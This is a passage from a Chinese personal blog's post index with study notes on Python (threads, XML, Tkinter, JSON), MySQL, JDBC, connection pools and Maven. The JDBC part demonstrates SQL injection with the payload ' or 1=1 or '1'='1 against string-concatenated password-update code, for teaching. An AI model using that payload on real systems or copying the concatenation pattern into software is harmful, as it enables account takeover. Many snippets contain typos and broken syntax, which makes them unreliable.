threading.Thread.__init__(self) self.threadID = threadID self.name = name self.q = q def run(self): print &quot;Starting &quot; + self.name process_data(self.name, self.q) print &quot;Exiting &quot; + self.name def process_data(threadName, q): while not exitFlag: queueLock.acquire() if not workQueue.empty(): data = q.get() queueLock.release() print &quot;%s processing %s&quot; % (threadName, data) else: queueLock.release() time.sleep(1) threadList = [&quot;Thread-1&quot;, &quot;Thread-2&quot;, &quot;Thread-3&quot;] nameList = [&quot;One&quot;, &quot;Two&quot;, &quot;Three&quot;, &quot;Four&quot;, &quot;Five&quot;] queueLock = threading.Lock() workQueue = Queue.Queue(10) threads = [] threadID = 1 # 创建新线程 for tName in threadList: thread = myThread(threadID, tName, workQueue) thread.start() threads.append(thread) threadID += 1 # 填充队列 queueLock.acquire() for word in nameList: workQueue.put(word) queueLock.release() # 等待队列清空 while not workQueue.empty(): pass # 通知线程是时候退出 exitFlag = 1 # 等待所有线程完成 for t in threads: t.join() print &quot;Exiting Main Thread&quot; python有三种方法解析XML，SAX，DOM，以及ElementTree: 1.SAX (simple API for XML ) python 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调用用户定义的回调函数来处理XML文件。 2.DOM(Document Object Model) 将XML数据在内存中解析成一个树，通过对树的操作来操作XML。 3.ElementTree(元素树) ElementTree就像一个轻量级的DOM，具有方便友好的API。代码可用性好，速度快，消耗内存少。 movies.xml &lt;collection shelf=&quot;New Arrivals&quot;&gt; &lt;movie title=&quot;Enemy Behind&quot;&gt; &lt;type&gt;War, Thriller&lt;/type&gt; &lt;format&gt;DVD&lt;/format&gt; &lt;year&gt;2003&lt;/year&gt; &lt;rating&gt;PG&lt;/rating&gt; &lt;stars&gt;10&lt;/stars&gt; &lt;description&gt;Talk about a US-Japan war&lt;/description&gt; &lt;/movie&gt; &lt;movie title=&quot;Transformers&quot;&gt; &lt;type&gt;Anime, Science Fiction&lt;/type&gt; &lt;format&gt;DVD&lt;/format&gt; &lt;year&gt;1989&lt;/year&gt; &lt;rating&gt;R&lt;/rating&gt; &lt;stars&gt;8&lt;/stars&gt; &lt;description&gt;A schientific fiction&lt;/description&gt; &lt;/movie&gt; &lt;movie title=&quot;Trigun&quot;&gt; &lt;type&gt;Anime, Action&lt;/type&gt; &lt;format&gt;DVD&lt;/format&gt; &lt;episodes&gt;4&lt;/episodes&gt; &lt;rating&gt;PG&lt;/rating&gt; &lt;stars&gt;10&lt;/stars&gt; &lt;description&gt;Vash the Stampede!&lt;/description&gt; &lt;/movie&gt; &lt;movie title=&quot;Ishtar&quot;&gt; &lt;type&gt;Comedy&lt;/type&gt; &lt;format&gt;VHS&lt;/format&gt; &lt;rating&gt;PG&lt;/rating&gt; &lt;stars&gt;2&lt;/stars&gt; &lt;description&gt;Viewable boredom&lt;/description&gt; &lt;/movie&gt; &lt;/collection&gt; 使用SAX解析xml #!/usr/bin/python # -*- coding: UTF-8 -*- import xml.sax class MovieHandler( xml.sax.ContentHandler ): def __init__(self): self.CurrentData = &quot;&quot; self.type = &quot;&quot; self.format = &quot;&quot; self.year = &quot;&quot; self.rating = &quot;&quot; self.stars = &quot;&quot; self.description = &quot;&quot; # 元素开始事件处理 def startElement(self, tag, attributes): self.CurrentData = tag if tag == &quot;movie&quot;: print &quot;*****Movie*****&quot; title = attributes[&quot;title&quot;] print &quot;Title:&quot;, title # 元素结束事件处理 def endElement(self, tag): if self.CurrentData == &quot;type&quot;: print &quot;Type:&quot;, self.type elif self.CurrentData == &quot;format&quot;: print &quot;Format:&quot;, self.format elif self.CurrentData == &quot;year&quot;: print &quot;Year:&quot;, self.year elif self.CurrentData == &quot;rating&quot;: print &quot;Rating:&quot;, self.rating elif self.CurrentData == &quot;stars&quot;: print &quot;Stars:&quot;, self.stars elif self.CurrentData == &quot;description&quot;: print &quot;Description:&quot;, self.description self.CurrentData = &quot;&quot; # 内容事件处理 def characters(self, content): if self.CurrentData == &quot;type&quot;: self.type = content elif self.CurrentData == &quot;format&quot;: self.format = content elif self.CurrentData == &quot;year&quot;: self.year = content elif self.CurrentData == &quot;rating&quot;: self.rating = content elif self.CurrentData == &quot;stars&quot;: self.stars = content elif self.CurrentData == &quot;description&quot;: self.description = content if ( __name__ == &quot;__main__&quot;): # 创建一个 XMLReader parser = xml.sax.make_parser() # turn off namepsaces parser.setFeature(xml.sax.handler.feature_namespaces, 0) # 重写 ContextHandler Handler = MovieHandler() parser.setContentHandler( Handler ) parser.parse(&quot;movies.xml&quot;) 使用xml.dom解析xml #!/usr/bin/python # -*- coding: UTF-8 -*- from xml.dom.minidom import parse import xml.dom.minidom # 使用minidom解析器打开 XML 文档 DOMTree = xml.dom.minidom.parse(&quot;movies.xml&quot;) collection = DOMTree.documentElement if collection.hasAttribute(&quot;shelf&quot;): print &quot;Root element : %s&quot; % collection.getAttribute(&quot;shelf&quot;) # 在集合中获取所有电影 movies = collection.getElementsByTagName(&quot;movie&quot;) # 打印每部电影的详细信息 for movie in movies: print &quot;*****Movie*****&quot; if movie.hasAttribute(&quot;title&quot;): print &quot;Title: %s&quot; % movie.getAttribute(&quot;title&quot;) type = movie.getElementsByTagName(&apos;type&apos;)[0] print &quot;Type: %s&quot; % type.childNodes[0].data format = movie.getElementsByTagName(&apos;format&apos;)[0] print &quot;Format: %s&quot; % format.childNodes[0].data rating = movie.getElementsByTagName(&apos;rating&apos;)[0] print &quot;Rating: %s&quot; % rating.childNodes[0].data description = movie.getElementsByTagName(&apos;description&apos;)[0] print &quot;Description: %s&quot; % description.childNodes[0].data Python GUI编程(Tkinter) Python 提供了多个图形开发界面的库，几个常用 Python GUI 库如下： Tkinter。 wxPython Jython 创建一个GUI程序 1、导入 Tkinter 模块 2、创建控件 3、指定这个控件的 master， 即这个控件属于哪一个 4、告诉 GM(geometry manager) 有一个控件产生了。 #!/usr/bin/python # -*- coding: UTF-8 -*- import Tkinter top = Tkinter.Tk() # 进入消息循环 top.mainloop() #!/usr/bin/python # -*- coding: UTF-8 -*- from Tkinter import * # 导入 Tkinter 库 root = Tk() # 创建窗口对象的背景色 # 创建两个列表 li = [&apos;C&apos;,&apos;python&apos;,&apos;php&apos;,&apos;html&apos;,&apos;SQL&apos;,&apos;java&apos;] movie = [&apos;CSS&apos;,&apos;jQuery&apos;,&apos;Bootstrap&apos;] listb = Listbox(root) # 创建两个列表组件 listb2 = Listbox(root) for item in li: # 第一个小部件插入数据 listb.insert(0,item) for item in movie: # 第二个小部件插入数据 listb2.insert(0,item) listb.pack() # 将小部件放置到主窗口中 listb2.pack() root.mainloop() # 进入消息循环 python json： #!/usr/bin/python import json data = [ { &apos;a&apos; : 1, &apos;b&apos; : 2, &apos;c&apos; : 3, &apos;d&apos; : 4, &apos;e&apos; : 5 } ] json = json.dumps(data) print json 以上代码执行结果为： [{&quot;a&quot;: 1, &quot;c&quot;: 3, &quot;b&quot;: 2, &quot;e&quot;: 5, &quot;d&quot;: 4}] 使用参数让 JSON 数据格式化输出： &gt;&gt;&gt; import json &gt;&gt;&gt; print json.dumps({&apos;a&apos;: &apos;Runoob&apos;, &apos;b&apos;: 7}, sort_keys=True, indent=4, separators=(&apos;,&apos;, &apos;: &apos;)) { &quot;a&quot;: &quot;Runoob&quot;, &quot;b&quot;: 7 } json.loads 用于解码 JSON 数据。 #!/usr/bin/python import json jsonData = &apos;{&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5}&apos;; text = json.loads(jsonData) print text 以上代码执行结果为： {u&apos;a&apos;: 1, u&apos;c&apos;: 3, u&apos;b&apos;: 2, u&apos;e&apos;: 5, u&apos;d&apos;: 4} 使用第三方库：Demjson $ tar -xvzf demjson-2.2.3.tar.gz $ cd demjson-2.2.3 $ python setup.py install 函数 描述 encode 将 Python 对象编码成 JSON 字符串 decode 将已编码的 JSON 字符串解码为 Python 对象 #!/usr/bin/python import demjson data = [ { &apos;a&apos; : 1, &apos;b&apos; : 2, &apos;c&apos; : 3, &apos;d&apos; : 4, &apos;e&apos; : 5 } ] json = demjson.encode(data) print json 以上代码执行结果为： [{&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5}] #!/usr/bin/python import demjson json = &apos;{&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5}&apos;; text = demjson.decode(json) print text 以上代码执行结果为： {u&apos;a&apos;: 1, u&apos;c&apos;: 3, u&apos;b&apos;: 2, u&apos;e&apos;: 5, u&apos;d&apos;: 4} python 100例 （待做）]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>python</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2FMySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[&lt;font size=6 color=&quot;#0000FF&quot;&gt; MYSQL &lt;/font&gt; navicat premium use databases; show tables; show databases; use test; desc student; -- 简单显示表结构信息 describe student; -- 详细显示表结构信息 show create table student; CREATE TABLE `student`()ENGINE = InnoDB (存储引擎) DEFAULT CHARSET=utf8 MyISAM 不支持事务，支持表级别的锁，锁粒度大 InnoDB 支持事务，支持锁粒度小，既有表锁又有行级别的锁 两种存储引擎的区别： 数据库里面的文件系统，规定了数据怎么存，怎么处理 InnoDB，适合处理电商银行的数据存储。 MyISAM，适合日志（读比写多的地方）（新项目几乎不用） use test; -- 给表改名字 alert table studnet rename student_new -- 给表中的字段改名字（同时还可以把字段对应的类型改了） alert table student change birthday birthday_new varchar(255); desc student; -- 给表添加字段，添加到最后 alter table student add addr varchar(500) -- 删除表中的字段 alter table student; drop addr; -- 将字段加到score字段后面 alter table student add addr varchar(500) after score; alter table student modify addr varchar(600) comment &apos;家庭住址&apos;; 类似：`addr` varchar(600) DEFAULT NULL COMMENT &apos;家庭住址&apos; show create table studnet; insert into person(id,name,salary) values(2,&apos;xx&apos;,1.0); delete from person where name = &apos;a&apos;; update person set salary = salary + 10,addr = &apos;yy&apos; where id = 3; alter table person add primary key(id); -- PRIMARY KEY(`id`);(这句在属性的后面) id int auto_increment, //自增id name varchar(100), primary key(id) delete from person where id in (3,4,5); CREATE TABLE `person`( `id` int(11) NOT NULL AUTO_INCREMENT, primay key(id) )ENGINE=InnoDB AUTO_INCREMENT=5 //已经即将自增到5了 select database(); create table student( id int, name varchar(20), teacher_id int ); create table teacher( id int, name varchar(20) ); alter table student modify teacher_id decimal(18,2) alter table student modify teacher_id int alter table teacher add PRIMARY key(id) -- 添加外键 alter table student add FOREING key (teacher_id) REFERENCES teacher(id); 主键跟外键都会有索引 KEY 代表索引 KEY `teacher_id`(`teacher_id`) select char_length(&apos;中国abc&apos;); -- 数字符的个数 select length(&apos;中国&apos;); -- utf8 一个汉字占3个字节 select concat(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;); -- abc 拼接参数 select concat_ws(&apos;=&apos;,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;); -- a=b=c 使用第一个参数作为中间符放入后面参数 select upper(&apos;aBcd&apos;); -- 大写 select lower(&apos;ABcd&apos;); -- 小写 select substring(&apos;系统信息类&apos;,1 ,3) -- 截取 select trim(&apos; abc. &apos;); -- 去前后空格 select curdate(); -- 当前日期对应的年月日 select now(); -- 当前日期到秒 select sysdate(); -- 一样，当前日期到秒 -- 返回当前日期时间对应的时间戳（单位：妙） select unix_timestamp(); select unix_timestamp(curtime()); -- 将时间戳转回日期时间到秒 select from_unixtime(123213213123); -- 只能到天，-2表示在now()基础上减2天,3的话就是加3天 select adddate(now(),-2); select if(1=1,&apos;成立&apos;,&apos;不成立&apos;); -- 如果有null，我就给它添一个值 use test; select id,name,ifnull(age,0) as age from person_2; create table student_info( id int, name varchar(20), score decimal(18,2) ); insert into student_info(id,name,score) values (1,&apos;小红&apos;,99.8) X4 -- 80以上 A -- 70-80 B -- 60-70 C -- &lt;60 D create view stu_score as select id,name,score, ( case when score &gt;= 80 then &apos;A&apos; when score &gt;= 70 and score &lt; 80 then &apos;B&apos; when score &gt;= 60 and score &lt; 70 then &apos;C&apos; when score &lt; 60 then &apos;D&apos; end ) as rank from student_info; select id,name,score,rank, ( case rank when &apos;A&apos; then &apos;优&apos; when &apos;B&apos; then &apos;中&apos; when &apos;C&apos; then &apos;良&apos; when &apos;D&apos; then &apos;差&apos; end ) as ch_rank from stu_score; -- &lt;&gt; 不等于 select * from stu_score where rank &lt;&gt; &apos;B&apos; select * from person where age is null select * from student_info where name like &apos;%小%&apos; -- 如果student_id相同，则接下来按score降序继续排序 select distinct name from person order by student_id asc,score desc limit 30 use cm; select database(); select count(*) from score group by cno; //not in 清洗重复数据 select cno,avg(degree) as chengji from score group by cno; use test; select id,name, (select name from teacher where id = teacher_id) as teacher_name from student; -- 子查询第三种场景，跟在where后面，通常和in搭配 use test; select * from student where teacher_id = ( select id from teacher where name = &apos;王老师&apos; ); -- 这种写法会先对连接的所有的表做一次完全笛卡尔积 -- 如果表很大，这种写法非常耗资源（内存） select * from student,teacher where student.teacher_id = teacher.id; -- 规范写法 (第一行的笛卡尔积不满足条件也就出现不了) select s.id,s.name,t.name as teacher_name from student s inner join teacher t on t.id = s.teacher_id //同名字段就选一个起别名 select s.id,s.name,t.name as teacher_name from student s left join teacher t on t.id = s.teacher_id //一般最重要的表放到左边 //优先使用inner，因为其性能好。如果有丢数据就改为left或其它的 性能优化 慢查询原因（通常DBMS都有自己的慢查询日志） 外部原因：内存太小，本地I/O瓶颈，网络I/O瓶颈。 内部原因：程序本身DB设计不合理，SQL语句使用不合理，无索引或者有索引但未充分利用。 学会使用explain分析简单的查询 数据库设计层面的优化 遵循数据库设计三范式（通俗地讲就是每个字段不可再拆分，尽量减少冗余字段）； 字段类型设计上，能使用数值就不要使用字符串，能使用日期时间就不要使用字符串，最好把字段声明为not null default 默认值； //字符串需要先查字符集转换编码，所以慢 //如果设计成允许null，数据库需要留选一段空间来标识其为null 为了避免表连接查询，必要的冗余字段是可以设置的； 能提前建立的索引要提前建好（经常用在where，group by，order by中的字段最好建索引） 创建索引方式一：alter table student_score add key idx_sc_s_c(sname,cname); 删除索引方式一：alter table student_score drop key idx_sc_s_c; 创建索引方式二：create index idx_sc_c on student_score(cname); 删除索引方式二：drop index idx_sc_c on student_score; explain select * from student_score; show create table student_score; explain select * from student_score where sname = &apos;小王&apos;; 加索引会降低写的性能 -- 添加索引 -- alter table student_score -- add key idx_sc_s (sname); alter table student_score add key idx_sc_s_c (sname,cname); 索引命名方式：idex_sc_s sc：哪张表 s,c：那个字段 SQL语句使用层面的优化 尽量不使用select *,而是要具体指定字段，比如select id,name...; 尽量不使用不等于&lt;&gt;; 不使用is null/is not null (虽然也会使用索引，但是性能损耗是由于default null的字段要比not null的字段多出额外的存储空间来标识这个字段的值是不是null)； 不使用or连接不同的字段； 不使用not in； 不在条件字段上使用函数； 不使用前置模糊查询(like &apos;%a&apos;);等。 因为上面的使用方式都会产生全表扫描(当然，如果实在没办法优化，全表扫描就扫描吧) 索引优化 建立索引的字段从内容上要有差异要有区分度。 索引提升的是读性能，如果一张表的写操作更多，则尽量不建或者少建索引。 使用where，group by，order by时，尽量充分利用建立索引的字段 数据导出导入 //不要使用客户端倒 mysql/bin/mysqldump.exe //往外倒 mysql/bin/mysqlimport.exe //往里倒 use test; select sname, max( case cname when &apos;Java&apos; then score else 0.0 end ) as Java, max( case cname when &apos;MySQL&apos; then score else 0.0 end ) as MySQL from student_score group by sname; -- group_concat()把每条记录取出来拼一块,separator分割的是每一行的数据,order by 要放在separator前面而不是后面 select sc.*,group_concat(canme,&apos;=&apos;,order by cname score separator &apos;|&apos;) as gc from student_score sc group by sname; JDBC Build Path-&gt;Configure Build Path... lib-&gt;xxx.jar Add JARs... JDBC相关的类与接口 java.sql.Driver 接口 java.sql.DriverManager类 //注册驱动 ctrl+o 搜索查看方法 Connection getConnection java.sql.Connection接口 void close() Statement createStatement() PreparedStatement prepareStatement(String sql java.sql.Statement 接口 void close() boolean execute(String sql) ResultSet executeQuery(String sql) int executeUpdate(String sql) void addBatch(String sql) //接受多条sql语句 int[] executeBatch() java.sql.PreparedStatement 接口 extends java.sql.Statement void setXXX(int parameterIndex,xxx value) ResultSet executeQuery() int executeUpdate() java.sql.ResultSet 接口 //查询的结果组成的二维表 void close() boolean next() xxx getXXX(String columnName) test(){ String className = &quot;&quot;;//com.mysql.jdbc.Driver Class.forName(className); DriverManager.getConncetion(url,user,password); //url : jdbc:mysql://127.0.0.1:3306/test //类似sql: use test; Statement stmt = conn.createStatement();//创建一个语句对象 StringBuffer sql = new StringBuffer(); sql.append(&quot; &quot;);//后面多一个空格以免不必要的麻烦 sql.append(&quot; &quot;); stmt.execute(sql.toString()); for(int i = 0 ; i &lt; 10 ; i ++){ StringBuffer sql = new StringBuffer(); sql.append(&quot;&quot;); sql.append(&quot;&quot;+i+&quot;&quot;); stmt.addBatch(sql.toString());//加入批处理 } int[] res = stmt.executeBatch(); StringBuffer sql = new StringBuffer(); sql.append(&quot;&quot;); ResultSet rs = stmt.executeQuery(sql.toString()); while(rs.next()){ int id = rs.getInt(&quot;id&quot;); } sql.append(&quot;insert into employee (id,name,salary) &quot;); sql.append(&quot;values (?,?,?); &quot;); PrepardStatement stmt = conn.prepareStatement(sql.toString()); //为了防止sql注入而开的接口，预编译语句对象，服务端编译一部分，客户端编译一部分 stmt.setInt(1,10); stmt.setString(2,&quot;小红&quot;); stmt.setDouble(3,9.0); stmt.executeUpdate(); stmt.close(); conn.close(); } main(){ try{ test(); }catch(Exception e){ } } //演示SQL注入 public interface LoginAuth{ boolean login(String username,String password); int modifyPassword(String newPwd,String username); } public class LoginAuthTest{ private static LoginAuth la; public static void testPrepared(){ la = new LoginAuthPreparedImpl(); } public static void testStmt(){ la = new LoginAuthStmtImpl(); } main(){ testStmt(); //testPrepared();//安全实现 String username = &quot;lhl&quot;; String password = &quot;123&quot;; boolean flag = la.login(username,password); if(flag){ sout(&quot;登陆成功!&quot;); } } } public class LoginAuthStmtImpl{ public boolean login(){ } public int modify(){ String username = &quot;&apos; or 1=1 or &apos;1&apos;=&apos;1&quot;; sql.append(&quot;update user_info &quot;); sql.append(&quot;set password = &apos;&quot; + newPwd + &quot;&apos; &quot;); sql.append(&quot;where username = &apos;&quot; + username +&quot;&apos;&quot;)； //把where变为true //&apos; or 1=1 or &apos;1&apos;=&apos;1 stmt.extcuteUpdate(sql.toString()); } } public class LoginAuthPrepareImpl{ public int modify(){ String username = &quot;&apos; or 1=1 or &apos;1&apos;=&apos;1&quot;; sql.append(&quot;update user_info &quot;); sql.append(&quot;set password = &apos;&quot; + newPwd + &quot;&apos; &quot;); sql.append(&quot;where username = &apos;&quot; + username +&quot;&apos;&quot;)； //把where变为true //&apos; or 1=1 or &apos;1&apos;=&apos;1 stmt.extcuteUpdate(); } } //基本都是在修改上做注入 Properties 文件的解析 涉及到的类是java.util.Properties 常用方法有 void load(Reader reader) String getProperty(String key) String getProperty(String key,String defaultValue) Properties prp = new Properties(); String src = &quot;xxx&quot; + File.separator + &quot;jdbc.properties&quot;; prp.load(new InputStreamReader(new FileInputStream(src),&quot;utf-8&quot;)); String className = prp.getProperty(&quot;className&quot;); 连接池： //数据库连接用完之后进入池子里，而不需要再次创建 DBCP连接池 的操作框架是MyBatis lib commons-dbcp2-2.2.0.jar commons-logging-1.2.jar commons-pool2-2.5.0.jar public static void testDBCP() throws Exception{ //DataBase Connection Pool //导入jar包 //创建连接池对象 BasicDataSource bds = new BasicDataSource(); //加载并配置连接信息className,url,user,password Properties p = new Properties(); p.load(new FileReader(&quot;xxx/xxx/jdbc.properties&quot;)) bds.setDriverClassName(&quot;com.mysql.jdbc.Driver&quot;); //bds.setUrl(&quot;jdbc:mysql://192.168.56.101:3306/lhl_test&quot;); bds.setUrl(p.getProperty(&quot;url&quot;)); bds.setUsername(&quot;root&quot;); bds.setPassword(&quot;root&quot;); Connection conn = bds.getConnection();//连接池会把toString重写 sout(conn); conn.close(); } //连接池单例化 public class Singleton{ private BasicDataSource bds; private static Singleton st; private Singleton(){ bds = new new BasicDataSource(); //加载并配置连接信息className,url,user,password Properties p = new Properties(); p.load(new FileReader(&quot;xxx/xxx/jdbc.properties&quot;)) bds.setDriverClassName(&quot;com.mysql.jdbc.Driver&quot;); //bds.setUrl(&quot;jdbc:mysql://192.168.56.101:3306/lhl_test&quot;); bds.setUrl(p.getProperty(&quot;url&quot;)); bds.setUsername(&quot;root&quot;); bds.setPassword(&quot;root&quot;); } //如果调一次锁一次是很耗性能的，所以不加在方法上，加在方法里面 public static Singleton getInstance(){ if(st == null){ synchronized (Singleton.class){ if(st == null){ st = new Singleton(); } } } return st; } public BasicDataSource getDbs(){ return dbs; } } //Singleton只会new一次，因此两者连接起来就是放在Singleton方法中 项目自动化构建 make(Makefile) 通常用于UNIX/Linux上软件的安装。自动化只局限于打包发布安装的阶段。依赖于OS平台命令，用于生成Makefile的configure文件依然需要开发者手动编写，耗时间。 Ant(build.xml) 可以认为是java版本的make。基于Java开发，只要安装了JDK/JRE就能使用，跨平台，编写build.xml的工作量相对较少，自动化也只是局限于打包发布阶段。 Maven(pom.xml)和Ant一样基于java开发，但是功能强大，修改pom.xml可以自动化支持软件生命周期的几乎所有过程（编译，测试，打包发布，安装） jar包依赖管理 apache-maven可以放到和jdk同一目录下 环境变量：MAVEN_HOME ,win10的改成M2_HOME , path mvn 查看 Maven配置： 只需要改仓库位置即可 如果不改的话，会放在 ~/.m2/repository这个目录下，所以要修改 &lt;settings xmlns= //根标签settings xmlns:xsi= xsi:schemaLacation= //这个是其遵循的约束的位置 &gt; //xmlns就是xml的规范文件位置 &lt;localRepository&gt;D:\\workspace\\maven\\repository&lt;/localRepository&gt; 将settings.xml 复制到.m2下 Preferences-&gt;Maven -&gt;User Settings-&gt;Global path (这个要与安装目录下的settings保持一致) User path (与根目录下settings保持一致) -&gt;Installations-&gt;Add-&gt;Directory..-&gt;path: 安装目录到文件夹就行 勾选这个文件夹 clean 是把bin下的文件都删掉，可以勾选clean完再构建这个选项 source folder 与 folder 区别：在构建时source文件夹里的文件会编译成class文件并输出到target文件夹里 new-&gt;maven.project-&gt;group 组名 ；artifact 项目名 &lt;build&gt; maven-compiler-plugin 2.3.2 &lt;/build&gt; String src = &quot;jdbc.properties&quot;; p.load(new InputStreamReader(JDBCUtil.class.getClassLoader().getResourceAsStream(src),&quot;utf-8&quot;)); 仓库存放位置会以groupId/artifactId/version/来存储 maven资源查找顺序-&gt;私服-&gt;中央仓库-&gt;到其他公共仓库找 阿里云公开的自己的私服maven仓库 &lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt; &lt;!-- 建议把测试代码与程序主代码分离 测试代码通通都迁移到src/test下面 这个目录下的代码不是使用Main方法机制运行的 所以要添加Junit组件 src/test中的内容最终是不会被打包发布的 --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;!-- 保证Maven最终打包发布的时候不会把这种jar包打到最终包里面,即junit这个jar包仅是测试用的不会打到最终包里 --&gt; &lt;/dependency&gt; @Test public void test1(){ } pom.xml-&gt;maven build... -&gt;Goals:clean test -&gt;Run 这样所有的测试方法就会自动跑一遍 mvn clean test &lt;!-- 如果是在cmd看输出结果的话，下面这个配置就不能加了，否则会乱码 --&gt; &lt;properties&gt; &lt;argLine&gt;-Dfile.encoding=UTF-8&lt;/argLine&gt; &lt;/properties&gt; Maven命令 mvn clean mvn clean compile mvn clean test mvn clean package mvn clean install mvn clean test /surefire /surefire-reports maven测试生成的文件夹 mvn clean mvn clean compile Maven打包提供给普通的项目用 mvn clean package Maven打包提供给Maven Project使用 1.本地跨Maven项目使用 不需要修改pom.xml mvn clean install 2.跨机器给别人的Maven Project使用 Maven 打包-把jar包当作独立程序直接运行 &lt;build&gt; &lt;plugin&gt; org.apache.maven.plugins maven-compiler-plugin &lt;/plugin&gt; &lt;plugin&gt; org.apache.maven.plugins maven-assembly-plugin &lt;configuration&gt; &lt;descripttorRefs&gt; &lt;descripttorRef&gt;jar-with-dependecies&lt;/descripttorRef&gt; &lt;/descripttorRefs&gt; &lt;archive&gt; &lt;manifest&gt; &lt;mainClass&gt;xx.x.x.x&lt;/mainClass&gt; &lt;/manifest&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/build&gt; ------------------------------------------------------------ ------------------------------------------------------------ 多表查询 给product中的这个cno添加一个外键约束 alter table product add foreign key(cno) references category(cid) 一对多：商品和分类 原则：在多的一方添加一个外键，指向一方的主键 多对多的建表： 多建一张中间表，将多对多的关系拆成一对多关系，中间表至少要有两个外键，这两个外键分别指向原来的那张表 一对一建表： 原则： 将一对一的情况，当作是一对多情况处理，在任意一张表添加一个外键，并且这个外键要唯一，指向另外一张表 直接将两张表合并成一张表 将两张表的主键建立起连接，让两张表里面主键相等 用途： 个人信息，拆表 SQLyog工具 sn.txt有注册码 内连接 --隐式内连接 select * from product p,category c where p.cno=c.cid; --显示内连接 select * from product p inner join category c on p.cno=c.cid --区别： 隐式内连接：在查询出结果的基础上去做的where条件过滤 显示内连接：带着条件去查询结果，执行效率要高 左外连接 左表：product select * from product p left outer join category c on p.cno=c.cid;]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>数据库</category>
        <category>MySQL</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>数据库</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[third]]></title>
    <url>%2F2018%2F09%2F06%2Fthird%2F</url>
    <content type="text"><![CDATA[这里需要点击全部显示才能显示!测试专用，没必要看 hello this is the third title;666666666666666666666666666666666666666666666666666666666666666 123]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[second_article]]></title>
    <url>%2F2018%2F09%2F01%2Fsecond-article%2F</url>
    <content type="text"><![CDATA[这里是测试专用，没必要看 这里需要点击全部显示才能显示! hello this is the second title;123456 我可以设置这一句的颜色哈哈 我还可以设置这一句的大小嘻嘻 我甚至可以设置这一句的颜色和大小呵呵 这一行需要居中 123]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
</search>
